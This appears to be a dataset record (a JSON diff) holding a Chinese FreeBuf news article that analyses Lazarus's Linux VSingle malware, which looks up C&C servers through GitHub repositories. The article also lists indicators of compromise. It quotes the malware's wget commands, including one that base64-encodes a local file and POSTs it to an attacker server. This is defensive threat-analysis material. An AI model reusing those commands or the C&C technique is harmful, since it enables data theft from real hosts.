@@ -1,0 +1,15 @@
+{
+  "doc_id": "lazarus_043",
+  "target_group": "lazarus",
+  "source_url": "https://www.freebuf.com/articles/network/338684.html",
+  "source_type": "news_article",
+  "source_name": "FreeBuf",
+  "title": "Lazarus 样本 VSingle：可通过 GitHub 进行 C&C 通信",
+  "language": "zh",
+  "raw_text": "某些恶意软件使用 DGA、虚假 C&C 服务器等方式隐藏原始 C&C 服务器，有些恶意软件则通过合法服务获取 C&C 服务器地址。最近，Lazarus 使用的恶意软件 VSingle 进行了更新升级，通过 GitHub 检索 C&C 服务器信息。VSingle 能够针对 Windows 与 Linux 双平台发起攻击，本文以后者为例进行介绍。\n\nVSingle 概述\n\nVSingle 默认带有三个硬编码的 C&C 服务器地址。当恶意软件无法连接 C&C 服务器时，就会访问 GitHub 以获取新的 C&C 服务器列表。下图显示了 VSingle 的操作流程：\n\nVSingle 操作流程\n\n首次连接发送的 UID 中包含主机名、内核版本号与 IP 地址八位字节，UPW 中包含 IP地址|30.0|12b的 base64 编码字符。\n\nhttps://mantis.westlinks.net/api/soap/mc_enum.php?uid=[]&upw=[]\n\nC&C 服务器的响应存储在 /tmp/.sess_%08x中，数据之后存放的是 AES 密钥、IV 数据与 base64 编码+RC4加密的命令。\n\nGitHub 访问模式\n\n请求的 GitHub 存储库不是固定的，而是动态生成的。以下是访问的 URL 的生成模式：\n\nhttps://raw.githubusercontent.com/%s/%s/master/README.de\n\n用户名和存储库名称是从以下列表中随机选择的字符串 + 添加的随机字符串：\n\n用户名与存储库名称\n\nGitHub 存储库的文件中包含一个 URL 地址，如下所示。\n\nGitHub 存储库\n\n恶意软件请求 GitHub 获取该 URL 地址，所有发现的 URL 如下所示：\n\nhttps://github.com/bgrav1ty13j/bPanda3\n\nhttps://github.com/fwo0d17n/fWr0te\n\nhttps://github.com/glucky18p/gluxuryboy\n\nhttps://github.com/gf00t18p/gpick/\n\nhttps://github.com/jv0siej21g/jlaz3rpik﻿\n\n通信方式\n\n新版本的 VSingle 使用 wget 与 C&C 服务器进行通信，如下所示。（注：Windows 平台下的 VSingle 仍然使用 Windows API）\n\n执行 wet 的命令\n\n大多数恶意软件为了避免留下痕迹，都使用系统调用或者其他方式与 C&C 服务器通信，但 VSingle 无惧于此。实际通信过程中，会执行的命令为：\n\nsh -c \"wget -t 1 --server-response --no-check-certificate --user-agent=\\\"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.24 Safari/537.36\\\" \\\"https://mantis.westlinks.net/api/soap/mc_enum.php?uid=15022694&upw=MTkyLjE2OC4yLjI0fDMwLjB8MTJi\\\" -O /tmp/.sess_7b00cf8e 2>&1 | awk '/^ HTTP/{print $2}'\"\n\n命令执行结果保存在 /tmp/.sess_%04x，其内容是 base64 编码的，通过 HTTP POST 请求发送，如下所示：\n\nsh -c \"wget -t 1 --server-response --no-check-certificate --post-data=\\\"uid=15022694&fipng=`base64 /tmp/.sess_%04x`\\\" --user-agent=\\\"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.24 Safari/537.36\\\" \\\"https://mantis.westlinks.net/api/soap/mc_enum.php?uid=15022694&jsid=[AES Key, IV]\\\" -O /tmp/.sess_7b00cf8e 2>&1 | awk '/^ HTTP/{print $2}'\"\n结论\n\n攻击者经常会攻陷合法的 Web 服务器或者使用合法的云服务来隐藏与 C&C 服务器的通信。很难检测到此类恶意软件，一定要多加注意。\n\nIOC\n\nhttps://mantis.westlinks.net/api/soap/mc_enum.php\nhttps://www.shipshorejob.com/ckeditor/samples/samples.php\nhttp://crm.vncgroup.com/cats/scripts/sphinxview.php\nhttps://ougreen.com/zone\nhttps://tecnojournals.com/general\nhttps://semiconductboard.com/xcror\nhttps://bluedragon.com/login\nhttps://tecnojournals.com/prest\n199ba618efc6af9280c5abd86c09cdf2d475c09c8c7ffc393a35c3d70277aed1\n2eb16dbc1097a590f07787ab285a013f5fe235287cb4fb948d4f9cce9efa5dbc\n414ed95d14964477bebf86dced0306714c497cde14dede67b0c1425ce451d3d7\n\n参考来源\n\nJPCERT",
+  "published_date": "2022-07-08",
+  "crawl_time": "2026-07-07T16:58:27Z",
+  "tags": [
+    "基础安全"
+  ]
+}
